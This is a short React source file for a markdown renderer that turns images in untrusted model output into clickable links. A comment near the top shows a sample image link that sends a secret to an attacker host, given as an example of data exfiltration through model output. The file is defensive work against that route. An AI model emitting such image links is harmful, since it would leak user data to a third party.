import ReactMarkdown from 'react-markdown';

// Model output is untrusted. An auto-loaded ![](https://attacker/?q=secret) image is a
// data-exfiltration channel, so images render as a plain link the user can choose to open.
function BlockedImage({ src, alt }) {
  if (!src) return <span>{alt}</span>;
  return (
    <a href={src} target="_blank" rel="noopener noreferrer nofollow">
      {alt || 'image'}
    </a>
  );
}

export default function SafeMarkdown({ components, ...props }) {
  return <ReactMarkdown {...props} components={{ ...components, img: BlockedImage }} />;
}
